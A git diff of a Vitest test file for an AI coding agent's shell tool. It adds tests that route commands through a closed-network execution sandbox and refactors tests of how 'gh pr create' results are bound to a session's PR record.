@@ -4,17 +4,29 @@
  * SPDX-License-Identifier: Apache-2.0
  */
 
+import { shellResultText } from '../utils/shell-result.js';
+import type { AnsiOutput } from '../utils/terminalSerializer.js';
 import {
   vi,
   describe,
   it,
   expect,
+  beforeAll,
+  afterAll,
   beforeEach,
   afterEach,
+  onTestFinished,
   type Mock,
 } from 'vitest';
 
 const mockShellExecutionService = vi.hoisted(() => vi.fn());
+const mockExecuteSandbox = vi.hoisted(() => vi.fn());
+vi.mock('../sandbox/execute-sandbox.js', () => ({
+  executeSandbox: mockExecuteSandbox,
+}));
+vi.mock('../sandbox/runtime-shell-policy.js', () => ({
+  assertShellSandboxCwd: vi.fn(),
+}));
 const mockExecFile = vi.hoisted(() => vi.fn());
 const mockDebugLogger = vi.hoisted(() => ({
   debug: vi.fn(),
@@ -57,7 +69,8 @@ vi.mock('../utils/github-prs.js', async (importOriginal) => ({
   fetchCurrentBranchPullRequest: vi.fn(),
 }));
 
-import { isCommandAllowed } from '../utils/shell-utils.js';
+import { isCommandAllowed, stripShellWrapper } from '../utils/shell-utils.js';
+import { SshExecutionEnvironment } from '../services/ssh-execution-environment.js';
 import {
   ShellTool,
   type ShellToolInvocation,
@@ -70,7 +83,6 @@ import {
   fetchCurrentBranchName,
   fetchCurrentBranchPullRequest,
 } from '../utils/github-prs.js';
-import { stripShellWrapper } from '../utils/shell-utils.js';
 import { ApprovalMode, type Config } from '../config/config.js';
 import {
   ToolConfirmationOutcome,
@@ -80,28 +92,26 @@ import {
 import {
   type ShellExecutionResult,
   type ShellOutputEvent,
+  type ShellRawCaptureSink,
 } from '../services/shellExecutionService.js';
 import * as fs from 'node:fs';
+import { mkdtemp, rm } from 'node:fs/promises';
 import * as os from 'node:os';
 import * as crypto from 'node:crypto';
 import path from 'node:path';
+import * as workspaceContextUtils from '../utils/workspaceContext.js';
 import { ToolErrorType } from './tool-error.js';
 import { runWithToolCallSource } from '../code-mode/tool-call-runtime.js';
 import { OUTPUT_UPDATE_INTERVAL_MS, parseNumstat } from './shell.js';
 import { createMockWorkspaceContext } from '../test-utils/mockWorkspaceContext.js';
+import { assertShellSandboxCwd } from '../sandbox/runtime-shell-policy.js';
 import { PermissionManager } from '../permissions/permission-manager.js';
 import { CommitAttributionService } from '../services/commitAttribution.js';
 
 interface ShellToolParameterJsonSchema {
   properties: {
-    command: {
-      description: string;
-    };
-    timeout: {
-      type: string;
-      minimum: number;
-      maximum: number;
-    };
+    command: { description: string };
+    timeout: { type: string; minimum: number; maximum: number };
   };
 }
 
@@ -110,7 +120,42 @@ function getCommandParameterDescription(shellTool: ShellTool): string {
     .properties.command.description;
 }
 
+/** The post-promote hooks a foreground run hands to the service. */
+type PostPromote = {
+  onData?: (event: { type: string; chunk: unknown }) => void;
+  onSettle?: (info: {
+    exitCode: number | null;
+    signal: number | NodeJS.Signals | null;
+    error?: Error;
+    endTime: number;
+  }) => void;
+};
+
+/** A one-line, unstyled AnsiOutput frame. */
+function ansiChunk(text: string): AnsiOutput {
+  const style = { bold: false, italic: false, dim: false, underline: false };
+  return [[{ text, ...style, inverse: false, fg: '', bg: '' }]];
+}
+
+/** A settled execution result; `rawOutput` mirrors `output` unless overridden. */
+function shellResult(
+  overrides: Partial<ShellExecutionResult> = {},
+): ShellExecutionResult {
+  return {
+    rawOutput: Buffer.from(overrides.output ?? ''),
+    output: '',
+    exitCode: 0,
+    signal: null,
+    error: null,
+    aborted: false,
+    pid: 12345,
+    executionMethod: 'child_process',
+    ...overrides,
+  };
+}
+
 describe('ShellTool', () => {
+  let outputDirectory: string;
   let shellTool: ShellTool;
   let mockConfig: Config;
   let mockShellOutputCallback: (event: ShellOutputEvent) => void;
@@ -126,13 +171,145 @@ describe('ShellTool', () => {
     check: ReturnType<typeof vi.fn>;
     recordWrite: ReturnType<typeof vi.fn>;
   };
+  /** What `mockConfig.getBackgroundShellRegistry()` returns. */
+  let registry: Record<
+    'register' | 'get' | 'getAll' | 'cancel' | 'complete' | 'fail',
+    Mock
+  >;
+
+  /** The entry the run registered with the background registry. */
+  const registeredEntry = () => registry.register.mock.calls[0][0];
+
+  /** Builds an invocation; foreground unless `params` says otherwise. */
+  const build = (command: string, params: Partial<ShellToolParams> = {}) =>
+    shellTool.build({ command, is_background: false, ...params });
+
+  // Executes with a promote-controller callback, as the interactive UI does
+  // (a ShellToolInvocation-only execute() param beyond the shared three).
+  const executeWithPromote = (
+    invocation: ToolInvocation<ShellToolParams, ToolResult>,
+  ) => {
+    const setPromoteAc = vi.fn();
+    const promise = (invocation as ShellToolInvocation).execute(
+      new AbortController().signal,
+      undefined,
+      {},
+      undefined,
+      setPromoteAc,
+    );
+    return { promise, setPromoteAc };
+  };
+
+  /** Asserts the spawn call; foreground spawns carry the post-promote options. */
+  const expectSpawned = (
+    command: unknown,
+    { cwd = expect.any(String), background = false } = {},
+  ) =>
+    expect(mockShellExecutionService).toHaveBeenCalledWith(
+      command,
+      cwd,
+      expect.any(Function),
+      expect.any(AbortSignal),
+      false,
+      expect.objectContaining({}),
+      background
+        ? { streamStdout: true }
+        : expect.objectContaining({ postPromote: expect.any(Object) }),
+    );
+
+  /** Asserts none of `mocks` was called. */
+  const expectNotCalled = (...mocks: unknown[]) => {
+    for (const mock of mocks) expect(mock).not.toHaveBeenCalled();
+  };
+
+  /** Asserts `text` contains each of `present` and none of `absent`. */
+  const expectText = (
+    text: unknown,
+    present: string[],
+    absent: string[] = [],
+  ) => {
+    for (const s of present) expect(text).toContain(s);
+    for (const s of absent) expect(text).not.toContain(s);
+  };
+
+  const setExplicitThreshold = (threshold: number) => {
+    (mockConfig.isTruncateToolOutputThresholdExplicit as Mock).mockReturnValue(
+      true,
+    );
+    (mockConfig.getTruncateToolOutputThreshold as Mock).mockReturnValue(
+      threshold,
+    );
+  };
+
+  /** Fakes timers until this test finishes. */
+  const fakeTimers = (config?: Parameters<typeof vi.useFakeTimers>[0]) => {
+    vi.useFakeTimers(config);
+    onTestFinished(() => {
+      vi.useRealTimers();
+    });
+  };
+
+  /** Spies on truncateToolOutput for this test: resolves `result`, or passes content through. */
+  const spyTruncation = async (result?: {
+    content: string;
+    outputFile?: string;
+  }) => {
+    const truncationModule = await import('./truncation.js');
+    const spy = vi.spyOn(truncationModule, 'truncateToolOutput');
+    // Restored even when assertions throw, or the spy leaks into later tests.
+    onTestFinished(() => {
+      spy.mockRestore();
+    });
+    return result
+      ? spy.mockResolvedValue(result)
+      : spy.mockImplementation(async (_config, _toolName, content) => ({
+          content,
+        }));
+  };
+
+  /** A minimal AbortSignal stand-in for the stubbed AbortSignal.timeout/any. */
+  const fakeSignal = (aborted: boolean, reason?: unknown) =>
+    ({
+      aborted,
+      reason,
+      addEventListener: vi.fn(),
+      removeEventListener: vi.fn(),
+    }) as unknown as AbortSignal;
+
+  /** The combined signal of a foreground run whose timeout fired. */
+  const timedOutSignal = () =>
+    fakeSignal(true, new DOMException('timed out', 'TimeoutError'));
+
+  // Routes AbortSignal.timeout/any to the given signals until this test ends
+  // (even on failure: a patched AbortSignal cascades into unrelated tests).
+  const stubAbortSignal = (timeout: unknown, any: unknown = timeout) => {
+    const originalAbortSignal = globalThis.AbortSignal;
+    vi.stubGlobal('AbortSignal', {
+      ...originalAbortSignal,
+      timeout: vi.fn().mockReturnValue(timeout),
+      any: vi.fn().mockReturnValue(any),
+    });
+    onTestFinished(() => {
+      vi.stubGlobal('AbortSignal', originalAbortSignal);
+    });
+  };
+
+  beforeAll(async () => {
+    const realOs = await vi.importActual<typeof import('node:os')>('node:os');
+    outputDirectory = await mkdtemp(
+      path.join(realOs.tmpdir(), 'qwen-shell-test-'),
+    );
+  });
+
+  afterAll(async () => {
+    await rm(outputDirectory, { recursive: true, force: true });
+  });
 
   beforeEach(() => {
     vi.clearAllMocks();
 
-    // Default the execFile seam to failure, matching what real git does
-    // against the tests' nonexistent cwd ('/test/dir'). Tests driving the
-    // attribution-note path override this per git subcommand.
+    // Default the execFile seam to failure, as real git does against the
+    // nonexistent '/test/dir'; attribution-note tests override per subcommand.
     mockExecFile.mockImplementation(
       (
         _file: unknown,
@@ -164,6 +341,14 @@ describe('ShellTool', () => {
       }),
       recordWrite: vi.fn(),
     };
+    registry = {
+      register: vi.fn(),
+      get: vi.fn(),
+      getAll: vi.fn().mockReturnValue([]),
+      cancel: vi.fn(),
+      complete: vi.fn(),
+      fail: vi.fn(),
+    };
 
     mockConfig = {
       getCoreTools: vi.fn().mockReturnValue([]),
@@ -178,7 +363,7 @@ describe('ShellTool', () => {
         .mockReturnValue(createMockWorkspaceContext('/test/dir')),
       storage: {
         getUserSkillsDirs: vi.fn().mockReturnValue(['/test/dir/.qwen/skills']),
-        getProjectTempDir: vi.fn().mockReturnValue('/tmp/qwen-temp'),
+        getProjectTempDir: vi.fn().mockReturnValue(outputDirectory),
         getProjectDir: vi.fn().mockReturnValue('/test/proj'),
       },
       getTruncateToolOutputThreshold: vi.fn().mockReturnValue(0),
@@ -202,14 +387,7 @@ describe('ShellTool', () => {
       getShouldUseNodePtyShell: vi.fn().mockReturnValue(false),
       getShellDefaultTimeoutMs: vi.fn().mockReturnValue(undefined),
       getShellHeartbeatIntervalMs: vi.fn().mockReturnValue(undefined),
-      getBackgroundShellRegistry: vi.fn().mockReturnValue({
-        register: vi.fn(),
-        get: vi.fn(),
-        getAll: vi.fn().mockReturnValue([]),
-        cancel: vi.fn(),
-        complete: vi.fn(),
-        fail: vi.fn(),
-      }),
+      getBackgroundShellRegistry: vi.fn().mockReturnValue(registry),
       getSessionService: vi.fn().mockReturnValue({
         getPrSessionPathForArchiveState: vi
           .fn()
@@ -219,21 +397,21 @@ describe('ShellTool', () => {
     } as unknown as Config;
 
     // executeBackground writes to disk; stub mkdirSync + createWriteStream.
+    // writeFileSync is reset because clearAllMocks keeps a test's throwing impl.
     vi.mocked(fs.mkdirSync).mockReturnValue(undefined);
+    vi.mocked(fs.writeFileSync).mockReturnValue(undefined);
     vi.mocked(fs.lstatSync).mockReturnValue({
       isSymbolicLink: () => false,
     } as fs.Stats);
-    vi.mocked(fs.statSync).mockReturnValue({
+    const fileStat = {
       dev: 1,
       ino: 2,
       isDirectory: () => false,
       isFile: () => true,
-    } as fs.Stats);
+    };
+    vi.mocked(fs.statSync).mockReturnValue(fileStat as fs.Stats);
     vi.mocked(fs.promises.stat).mockResolvedValue({
-      dev: 1,
-      ino: 2,
-      isDirectory: () => false,
-      isFile: () => true,
+      ...fileStat,
       mtimeMs: 1,
       size: 4,
     } as fs.Stats);
@@ -241,12 +419,9 @@ describe('ShellTool', () => {
       write: vi.fn(),
       end: vi.fn(),
       on: vi.fn(),
-      // Both settle paths (promote + executeBackground) wait for the
-      // stream flush via `once('finish', ...)` before transitioning
-      // the registry. Default impl: immediately invoke the handler so
-      // tests don't hang waiting for an event the mocked stream never
-      // emits naturally. Ordering-sensitive tests install their own
-      // deferred stream via `mockReturnValueOnce`.
+      // Both settle paths (promote + executeBackground) wait for
+      // `once('finish')` before transitioning the registry; fire it at once so
+      // tests don't hang. Ordering-sensitive tests install a deferred stream.
       once: vi.fn((event: string, handler: () => void) => {
         if (event === 'finish') handler();
       }),
@@ -288,6 +463,108 @@ describe('ShellTool', () => {
     );
   });
 
+  describe('internal runtime sandbox routing', () => {
+    beforeEach(() => {
+      mockConfig.getShellExecutionSandbox = vi.fn().mockReturnValue({
+        workspace: '/test/dir',
+        installation: '/install',
+        state: '/state',
+        filesystem: 'workspace-write',
+        network: 'closed',
+      });
+      mockExecuteSandbox.mockResolvedValue({
+        pid: 12345,
+        result: Promise.resolve({
+          ...shellResult({ output: 'confined' }),
+          sandboxStatus: { state: 'confirmed', exitCode: 0 },
+        }),
+      });
+    });
+
+    it('rejects a directory the sandbox will not admit at build time', () => {
+      vi.mocked(assertShellSandboxCwd).mockImplementationOnce(() => {
+        throw new Error('outside');
+      });
+      expect(() => build('ls', { directory: '/elsewhere' })).toThrow(
+        "Directory '/elsewhere' must be an existing directory inside the execution sandbox workspace.",
+      );
+      expect(assertShellSandboxCwd).toHaveBeenCalledWith(
+        mockConfig.getShellExecutionSandbox(),
+        '/elsewhere',
+      );
+    });
+
+    it('runs sed through the backend without host preview or write', async () => {
+      const invocation = build("sed -i 's/old/new/' file.txt");
+      expect(
+        (await invocation.getConfirmationDetails(new AbortController().signal))
+          .type,
+      ).toBe('exec');
+      await invocation.execute(new AbortController().signal);
+      expect(mockExecuteSandbox).toHaveBeenCalledOnce();
+      expect(mockFileSystemService.readTextFile).not.toHaveBeenCalled();
+      expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
+      expect(mockShellExecutionService).not.toHaveBeenCalled();
+    });
+
+    it('keeps Git/PR metadata subprocesses off the host', async () => {
+      const gitSpy = vi.spyOn(
+        await import('node:child_process'),
+        'execFileSync',
+      );
+      onTestFinished(() => {
+        gitSpy.mockRestore();
+      });
+      const commands = [
+        'git commit -m test',
+        'gh pr create --title test --body test',
+        'gh pr create --title background --body background',
+      ];
+      for (const [i, command] of commands.entries()) {
+        await build(command, { is_background: i === 2 }).execute(
+          new AbortController().signal,
+        );
+      }
+      expect(mockExecuteSandbox).toHaveBeenCalledTimes(3);
+      commands.forEach((command, i) =>
+        expect(mockExecuteSandbox.mock.calls[i][1].args).toEqual([
+          '-c',
+          command,
+        ]),
+      );
+      expectNotCalled(gitSpy, mockExecFile, fetchCurrentBranchPullRequest);
+    });
+
+    it('routes background execution and closes its stream on setup failure', async () => {
+      const destroy = vi.fn();
+      vi.mocked(fs.createWriteStream).mockReturnValue({
+        on: vi.fn(),
+        destroy,
+      } as unknown as fs.WriteStream);
+      mockExecuteSandbox.mockRejectedValueOnce(
+        new Error('sandbox setup failed'),
+      );
+      await expect(
+        build('echo test', { is_background: true }).execute(
+          new AbortController().signal,
+        ),
+      ).rejects.toThrow('sandbox setup failed');
+      expect(mockExecuteSandbox.mock.calls[0][4]).toBe(false);
+      expect(destroy).toHaveBeenCalledOnce();
+      expect(fs.rmSync).toHaveBeenCalledWith(
+        expect.stringMatching(/\.output$/),
+        {
+          force: true,
+        },
+      );
+      expectNotCalled(registry.register, mockShellExecutionService);
+    });
+
+    it('uses a conservative permission default without host git probes', async () => {
+      expect(await build('git status').getDefaultPermission()).toBe('ask');
+    });
+  });
+
   describe('gh pr create binding', () => {
     const fetchCurrentBranchPullRequestMock = vi.mocked(
       fetchCurrentBranchPullRequest,
@@ -297,14 +574,12 @@ describe('ShellTool', () => {
     const upsertSessionPrsMock = vi.mocked(upsertSessionPrs);
 
     beforeEach(() => {
-      // Default attribution identity: the fixture URLs belong to `o/r` and
-      // the session sits on `main`. Tests override per shape.
+      // Default identity: fixture URLs belong to `o/r`, the session sits on
+      // `main`, and every offered candidate lands as a new binding.
       fetchCurrentBranchNameMock.mockResolvedValue('main');
       fetchAttributionRepoKeysMock.mockResolvedValue({
         resolved: 'github.com/o/r',
       });
-      // Default: every offered candidate lands as a new binding. Tests that
-      // simulate an already-bound number override this per test.
       upsertSessionPrsMock.mockImplementation(
         async (_filePath, candidates) => ({
           prs: [],
@@ -315,250 +590,205 @@ describe('ShellTool', () => {
       );
     });
 
+    /** gh's view of the branch's PR `number` in repo o/r. */
+    const branchPr = (number: number, state: 'open' | 'merged' = 'open') => ({
+      status: 'pr' as const,
+      number,
+      url: `https://github.com/o/r/pull/${number}`,
+      state,
+    });
+
+    /** The branch had no PR before the run; gh resolves PR `number` after it. */
+    const mockCreatedPr = (
+      number: number,
+      pr: { url?: string; headRefName?: string } = {},
+    ) =>
+      fetchCurrentBranchPullRequestMock
+        .mockResolvedValueOnce({ status: 'none' })
+        .mockResolvedValueOnce({
+          ...branchPr(number),
+          headRefName: 'main',
+          ...pr,
+        });
+
+    /** The sidecar record for PR `number` (o/r, open). */
+    const prRecord = (number: number) => ({
+      number,
+      url: `https://github.com/o/r/pull/${number}`,
+      state: 'open',
+    });
+
+    /** Asserts PR `number` was offered to the active session's sidecar. */
+    const expectBound = (number: number) =>
+      expect(upsertSessionPrsMock).toHaveBeenCalledWith(
+        '/test/proj/chats/test-session.pr.json',
+        [expect.objectContaining({ number })],
+      );
+
+    const sessionServiceMock = () =>
+      mockConfig.getSessionService() as unknown as {
+        emitSessionPrBound: Mock;
+        getSessionLocation: unknown;
+        getPrSessionPathForArchiveState: Mock;
+      };
+
+    // Runs `command` in `directory` to `output`/`exitCode` (+ `result`
+    // overrides); `promote` gets the exposed promote controller before settle.
     async function runShell(
       command: string,
-      result: Partial<ShellExecutionResult>,
-    ): Promise<void> {
+      output: string,
+      exitCode = 0,
+      {
+        directory = '/test/dir',
+        result = {},
+        promote,
+      }: {
+        directory?: string;
+        result?: Partial<ShellExecutionResult>;
+        promote?: (promoteAc: AbortController) => void;
+      } = {},
+    ): Promise<ToolResult> {
       const callsBefore = mockShellExecutionService.mock.calls.length;
-      const invocation = shellTool.build({
-        command,
-        directory: '/test/dir',
-        is_background: false,
-      });
-      const resultPromise = invocation.execute(new AbortController().signal);
-      // Wait for THIS invocation's spawn: `.toHaveBeenCalled()` alone is
-      // already true after an earlier runShell in the same test, and
-      // resolving the stale resolver first would orphan the new one (the
-      // pre-spawn attribution snapshot yields before the service call).
+      const invocation = build(command, { directory });
+      const { promise: resultPromise, setPromoteAc } = promote
+        ? executeWithPromote(invocation)
+        : {
+            promise: invocation.execute(new AbortController().signal),
+            setPromoteAc: undefined,
+          };
+      // Wait for THIS invocation's spawn: after an earlier runShell,
+      // `.toHaveBeenCalled()` is already true, and resolving the stale resolver
+      // would orphan the new one (the pre-spawn snapshot yields before the call).
       await vi.waitFor(() =>
         expect(mockShellExecutionService.mock.calls.length).toBeGreaterThan(
           callsBefore,
         ),
       );
-      resolveExecutionPromise(result as ShellExecutionResult);
-      await resultPromise;
+      promote?.(setPromoteAc!.mock.calls[0][0] as AbortController);
+      resolveExecutionPromise({
+        output,
+        exitCode,
+        aborted: false,
+        ...result,
+      } as ShellExecutionResult);
+      const toolResult = await resultPromise;
       // The binding hook is fire-and-forget; give its async gh attribution a
       // beat so negative assertions cannot pass merely because the hook has
       // not scheduled yet.
       await new Promise((resolve) => setTimeout(resolve, 20));
+      return toolResult;
     }
 
+    const PR_77 = 'https://github.com/o/r/pull/77\n';
+    const PR_42 = 'https://github.com/o/r/pull/42\n';
+    const CREATE_OR_VIEW =
+      'gh pr create --fill || gh pr view --json url --jq .url';
+
     it('writes the PR sidecar when gh attributes the create to the branch PR', async () => {
-      // A real create: the branch had no PR before the run (pre-run
-      // snapshot `none`), gh resolves the new one after.
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'none',
-      });
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'pr',
-        number: 77,
-        url: 'https://github.com/o/r/pull/77',
-        state: 'open',
-        headRefName: 'main',
-      });
-      await runShell('gh pr create --title x --body y', {
-        output: 'noise\nhttps://github.com/o/r/pull/77\n',
-        exitCode: 0,
-        aborted: false,
-      });
+      // A real create: pre-run snapshot `none`, gh resolves the new PR after.
+      mockCreatedPr(77);
+      await runShell(
+        'gh pr create --title x --body y',
+        'noise\nhttps://github.com/o/r/pull/77\n',
+      );
 
       expect(upsertSessionPrsMock).toHaveBeenCalledWith(
         '/test/proj/chats/test-session.pr.json',
-        [
-          {
-            number: 77,
-            url: 'https://github.com/o/r/pull/77',
-            state: 'open',
-            source: 'create',
-          },
-        ],
+        [{ ...prRecord(77), source: 'create' }],
       );
       // The daemon never sees the child's sidecar write; the catalog
       // notification is what makes the badge appear.
-      const sessionService = mockConfig.getSessionService() as unknown as {
-        emitSessionPrBound: ReturnType<typeof vi.fn>;
-      };
-      expect(sessionService.emitSessionPrBound).toHaveBeenCalledWith(
+      expect(sessionServiceMock().emitSessionPrBound).toHaveBeenCalledWith(
         'test-session',
-        {
-          number: 77,
-          url: 'https://github.com/o/r/pull/77',
-          state: 'open',
-        },
+        prRecord(77),
       );
     });
 
     it('binds the PR gh resolved even when a later echo prints another URL', async () => {
       // A supersede/changelog echo printing a second same-repo URL must not
       // steer the binding: gh's own resolution for the branch wins.
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'none',
-      });
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'pr',
-        number: 100,
-        url: 'https://github.com/o/r/pull/100',
-        state: 'open',
-        headRefName: 'main',
-      });
-      await runShell('gh pr create --fill', {
-        output:
-          'https://github.com/o/r/pull/100\nsuperseded by https://github.com/o/r/pull/42\n',
-        exitCode: 0,
-        aborted: false,
-      });
-
-      expect(upsertSessionPrsMock).toHaveBeenCalledWith(
-        '/test/proj/chats/test-session.pr.json',
-        [expect.objectContaining({ number: 100 })],
+      mockCreatedPr(100);
+      await runShell(
+        'gh pr create --fill',
+        'https://github.com/o/r/pull/100\nsuperseded by https://github.com/o/r/pull/42\n',
       );
+
+      expectBound(100);
     });
 
     it('does not bind when the create fails without a URL', async () => {
       fetchCurrentBranchPullRequestMock.mockResolvedValue({ status: 'none' });
-      await runShell('gh pr create --title x', {
-        output: 'error: not logged in',
-        exitCode: 1,
-        aborted: false,
-      });
+      await runShell('gh pr create --title x', 'error: not logged in', 1);
 
       expect(upsertSessionPrsMock).not.toHaveBeenCalled();
     });
 
     it('does not bind a non-zero exit even when the output carries a URL', async () => {
-      // A compound command can exit non-zero after another segment printed a
-      // PR URL; only a fully successful run may bind.
-      fetchCurrentBranchPullRequestMock.mockResolvedValue({
-        status: 'pr',
-        number: 1234,
-        url: 'https://github.com/o/r/pull/1234',
-        state: 'open',
-      });
-      await runShell('gh pr create --fill; cat notes.txt', {
-        output: 'https://github.com/o/r/pull/1234\n',
-        exitCode: 1,
-        aborted: false,
-      });
+      // A compound can exit non-zero after another segment printed a PR URL;
+      // only a fully successful run may bind.
+      fetchCurrentBranchPullRequestMock.mockResolvedValue(branchPr(1234));
+      await runShell(
+        'gh pr create --fill; cat notes.txt',
+        'https://github.com/o/r/pull/1234\n',
+        1,
+      );
 
       expect(upsertSessionPrsMock).not.toHaveBeenCalled();
     });
 
     it('does not bind a URL that gh did not vouch for', async () => {
-      // The execution gate passes for these shapes, but gh resolves no PR
-      // for the working branch — nothing was created, so nothing binds,
-      // whatever same-repo URL the output carries.
+      // These shapes pass the execution gate, but gh resolves no PR for the
+      // branch: nothing was created, whatever same-repo URL the output has.
       fetchCurrentBranchPullRequestMock.mockResolvedValue({ status: 'none' });
-      await runShell('gh pr create --fill; cat notes.txt', {
-        output: 'create failed\nhttps://github.com/o/r/pull/1234\n',
-        exitCode: 0,
-        aborted: false,
-      });
+      await runShell(
+        'gh pr create --fill; cat notes.txt',
+        'create failed\nhttps://github.com/o/r/pull/1234\n',
+      );
       await runShell(
         'echo "retry: npm test && gh pr create --fill" && cat pr_url.txt',
-        {
-          output: 'https://github.com/o/r/pull/42\n',
-          exitCode: 0,
-          aborted: false,
-        },
+        PR_42,
       );
-      await runShell('echo https://github.com/o/r/pull/42 # && gh pr create', {
-        output: 'https://github.com/o/r/pull/42\n',
-        exitCode: 0,
-        aborted: false,
-      });
+      await runShell(
+        'echo https://github.com/o/r/pull/42 # && gh pr create',
+        PR_42,
+      );
 
       expect(upsertSessionPrsMock).not.toHaveBeenCalled();
     });
 
     it('does not bind when gh resolves a PR whose URL is absent from the output', async () => {
-      // `gh pr create --help` passes the execution gate; no PR existed
-      // before the run, gh resolves one after, but this run printed no
-      // created URL for it — the output check declines.
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'none',
-      });
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'pr',
-        number: 5,
-        url: 'https://github.com/o/r/pull/5',
-        state: 'open',
-        headRefName: 'main',
-      });
-      await runShell('gh pr create --help', {
-        output: 'usage: gh pr create\n',
-        exitCode: 0,
-        aborted: false,
-      });
+      // `--help` passes the execution gate and gh resolves a new PR after the
+      // run, but this run printed no created URL: the output check declines.
+      mockCreatedPr(5);
+      await runShell('gh pr create --help', 'usage: gh pr create\n');
 
       expect(upsertSessionPrsMock).not.toHaveBeenCalled();
     });
 
     it('attributes against the execution directory, not the target dir', async () => {
-      // The `directory` parameter may point at another registered
-      // workspace; gh must attribute the repo the command actually ran in,
-      // or a `directory`-parameter create binds nothing (or a wrong-repo
-      // PR whose URL happens to appear in the output).
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'none',
-      });
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'pr',
-        number: 77,
-        url: 'https://github.com/o/r/pull/77',
-        state: 'open',
-        headRefName: 'main',
-      });
-      const invocation = shellTool.build({
-        command: 'gh pr create --fill',
+      // `directory` may point at another registered workspace; attributing the
+      // target dir instead would bind nothing (or a wrong-repo PR whose URL
+      // happens to appear in the output).
+      mockCreatedPr(77);
+      await runShell('gh pr create --fill', PR_77, 0, {
         directory: '/test/dir/nested',
-        is_background: false,
       });
-      const resultPromise = invocation.execute(new AbortController().signal);
-      await vi.waitFor(() =>
-        expect(mockShellExecutionService).toHaveBeenCalled(),
-      );
-      resolveExecutionPromise({
-        output: 'https://github.com/o/r/pull/77\n',
-        exitCode: 0,
-        aborted: false,
-      } as ShellExecutionResult);
-      await resultPromise;
-      await new Promise((resolve) => setTimeout(resolve, 20));
 
       expect(fetchCurrentBranchPullRequestMock).toHaveBeenCalledWith(
         '/test/dir/nested',
         undefined,
       );
-      expect(upsertSessionPrsMock).toHaveBeenCalledWith(
-        '/test/proj/chats/test-session.pr.json',
-        [expect.objectContaining({ number: 77 })],
-      );
+      expectBound(77);
     });
 
     it('passes inline gh credentials from the command to the verification legs', async () => {
-      // The gate advertises `GH_TOKEN=x gh pr create --fill`; both gh legs
-      // must authenticate the way the create itself did, or an inline-token
-      // create with no ambient gh auth verifies bare and silently misses.
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'none',
-      });
-      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
-        status: 'pr',
-        number: 77,
-        url: 'https://github.com/o/r/pull/77',
-        state: 'open',
-        headRefName: 'main',
-      });
-      await runShell('GH_TOKEN=t0ken gh pr create --fill', {
-        output: 'https://github.com/o/r/pull/77\n',
-        exitCode: 0,
-        aborted: false,
-      });
+      // Both gh legs must authenticate as the gated create did, or a create
+      // with no ambient gh auth silently misses. The record OVERLAYS
+      // process.env (it becomes the child's whole env, so a bare record drops
+      // PATH/HOME), and the repo-identity leg needs the token too.
+      mockCreatedPr(77);
+      await runShell('GH_TOKEN=t0ken gh pr create --fill', PR_77);
 
-      // The inline record is an OVERLAY of the full process env: the gh
-      // legs receive it as the child's ENTIRE environment, so a bare
-      // partial record would drop PATH/HOME and fail every leg before it
-      // authenticates — and the repo-identity leg needs the token too.
       const overlayEnv = { ...process.env, GH_TOKEN: 't0ken' };
       expect(fetchCurrentBranchPullRequestMock).toHaveBeenCalledWith(
         '/test/dir',
@@ -571,245 +801,114 @@ describe('ShellTool', () => {
     });
 
     it('does not bind when gh resolves a merged or closed PR', async () => {
-      // The retry shape passes the execution gate and exits 0 without
-      // creating anything; gh resolves the branch's EXISTING merged PR, and
-      // the state gate must decline it — binding would stamp 'open' over a
-      // merged state and move the entry to the tail with a fresh createdAt.
-      fetchCurrentBranchPullRequestMock.mockResolvedValue({
-        status: 'pr',
-        number: 42,
-        url: 'https://github.com/o/r/pull/42',
-        state: 'merged',
-      });
-      await runShell('gh pr create --fill || gh pr view --json url --jq .url', {
-        output: 'https://github.com/o/r/pull/42\n',
-        exitCode: 0,
-        aborted: false,
-      });
+      // The retry shape exits 0 without creating anything and gh resolves the
+      // branch's EXISTING merged PR; binding would stamp 'open' over it and
+      // move the entry to the tail with a fresh createdAt.
+      fetchCurrentBranchPullRequestMock.mockResolvedValue(
+        branchPr(42, 'merged'),
+      );
+      await runShell(CREATE_OR_VIEW, PR_42);
 
       expect(upsertSessionPrsMock).not.toHaveBeenCalled();
     });
 
     it('does not bind an open PR the branch already had before the run', async () => {
-      // The retry shape exits 0 through its view segment and prints the
-      // existing PR's URL. The pre-run snapshot matches the post-run
-      // resolution, proving nothing was created — the session must not be
-      // stamped as creator of a PR it merely resolved (a fresh createdAt
-      // would falsify the badge's binding-time order, and at the cap the
-      // single candidate would evict a genuine binding).
+      // The matching pre-run snapshot proves nothing was created; stamping the
+      // session as creator would falsify the badge's binding-time order, and
+      // at the cap the single candidate would evict a genuine binding.
       fetchCurrentBranchPullRequestMock.mockReset();
-      fetchCurrentBranchPullRequestMock.mockResolvedValue({
-        status: 'pr',
-        number: 42,
-        url: 'https://github.com/o/r/pull/42',
-        state: 'open',
-      });
-      await runShell('gh pr create --fill || gh pr view --json url --jq .url', {
-        output: 'https://github.com/o/r/pull/42\n',
-        exitCode: 0,
-        aborted: false,
-      });
+      fetchCurrentBranchPullRequestMock.mockResolvedValue(branchPr(42));
+      await runShell(CREATE_OR_VIEW, PR_42);
 
       expect(upsertSessionPrsMock).not.toHaveBeenCalled();
     });
 
     it('does not bind when the pre-run snapshot errored', async () => {
-      // An errored pre-run fetch proves nothing about the branch's prior
-      // PRs; failing open would bind the branch's existing PR as this
-      // session's creation when the post-run fetch recovers. The post-run
-      // value is a persistent fallback: the errored snapshot declines before
-      // any second fetch, so a second Once would leak into later tests.
+      // An errored pre-run fetch proves nothing; failing open would bind the
+      // existing PR once the post-run fetch recovers. The fallback is not Once:
+      // declining skips the second fetch, so a Once would leak into later tests.
       fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
         status: 'error',
       });
-      fetchCurrentBranchPullRequestMock.mockResolvedValue({
-        status: 'pr',
-        number: 42,
-        url: 'https://github.com/o/r/pull/42',
-        state: 'open',
-      });
